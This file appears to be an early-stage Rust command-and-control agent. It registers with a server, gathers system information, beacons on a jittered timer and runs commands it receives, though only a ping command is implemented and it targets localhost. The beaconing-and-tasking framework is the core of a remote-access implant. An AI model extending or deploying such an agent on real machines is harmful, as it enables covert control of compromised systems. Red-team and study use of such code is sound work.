mod macros;
mod schemas;
mod systeminfo;

use chrono::{
    Local,
};
use reqwest::{
    Client
};
use schemas::{
    AgentConfig,
    BeaconResponse,
    Command,
};
use serde_json::{
    json,
    Value,
};
use std::time::{
    Duration,
};
use systeminfo::{ 
    SystemInfo, 
    get_system_info
};
use tokio::time::{
    sleep,
};

#[derive(Debug)]
pub struct C2Agent {
    id: u64,
    agent_config: AgentConfig,
    http_client: Client,
    system_info: SystemInfo,
    commands: Vec<Command>,
}

impl C2Agent {
    pub async fn new(server_url: &str, agent_name: &str, duration: u64, jitter_percent: f64) -> Result<Self, Box<dyn std::error::Error>> {
        if jitter_percent < 0.0 || jitter_percent > 1.0 {
            return Err("Jitter percent cannot be less than 0 or exceed 1".into());
        }

        // Create client for http requests
        let client = Client::new();

        // Register agent with server to get id
        let register_url = format!("{}/agent/register", &server_url);
        let request_body = json!({
            "name": agent_name
        });

        let response: Value = client
            .post(register_url)
            .json(&request_body)
            .send()
            .await?
            .error_for_status()?
            .json()
            .await?;

        let uid = response["uid"]
            .as_u64()
            .ok_or("Response missing `uid` field")?;

        // Create agent config
        let agent_config = AgentConfig {
            name: agent_name.to_string(),
            server_url: server_url.to_string(),
            duration: duration,
            jitter_percent: jitter_percent,
        };

        Ok(Self {
            id: uid,
            agent_config: agent_config,
            http_client: client,
            system_info: get_system_info()?,
            commands: Vec::new(),
        })
    }

    /// Main loop for agent process
    pub async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let base_duration = self.agent_config.duration;
        let jitter_percent = self.agent_config.jitter_percent;

        loop {
            // Send beacon after sleep
            self.send_beacon().await?;

            // Actions
            self.execute_commands().await?;
            self.clear_commands();

            // Calculate sleep duration with jitter
            let jitter: f64 = (base_duration as f64) * jitter_percent;
            let min = base_duration as f64 - jitter;
            let max = base_duration as f64 + jitter;
            let sleep_duration = rand::random_range(min..=max);

            // Sleep until next duration w/ jitter is over
            sleep(Duration::from_secs(sleep_duration as u64)).await;
        }
    }

    /// Send beacon to get information from server
    pub async fn send_beacon(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let beacon_url = format!("{}/agent/beacon", self.agent_config.server_url);
        let request_body = json!({
            "name": self.agent_config.name,
            "uid": self.id,
        });

        info!("Beaconing to server...");

        // Send beacon request
        let response: BeaconResponse = self.http_client
            .post(beacon_url)
            .json(&request_body)
            .send()
            .await?
            .error_for_status()?
            .json()
            .await?;

        // Add commands
        let commands = response.commands;
        self.commands.extend(commands);

        info!("Added {} new command(s)", self.commands.len());

        Ok(())
    }

    /// Execute commands
    pub async fn execute_commands(&self) -> Result<(), Box<dyn std::error::Error>> {
        for command in self.commands.iter() {
            match command.command_id {
                0 => {
                    self.pingc2().await;
                },
                _ => {
                    println!("don't understand command")
                }
            }
        }

        Ok(())
    }

    /// Clear commands member after execution
    pub fn clear_commands(&mut self) -> () {
        self.commands = Vec::new();
    }

    /* Commands */
    pub async fn pingc2(&self) -> () {
        let ping_url = format!("{}/agent/ping", self.agent_config.server_url);

        if let Err(e) = self.http_client.get(ping_url).send().await {
            eprintln!("C2 ping failed: {e}");
        }
    }
}

#[tokio::main]
async fn main() ->  Result<(), Box<dyn std::error::Error>> {
    let server_url = "http://127.0.0.1:8080";
    let agent_name = "agent-name";
    let duration: u64 = 10;
    let jitter_percent: f64 = 0.5;

    let mut x = C2Agent::new(server_url, agent_name, duration, jitter_percent).await?;

    println!("{:#?}", x);

    x.run().await?;

    Ok(())
}
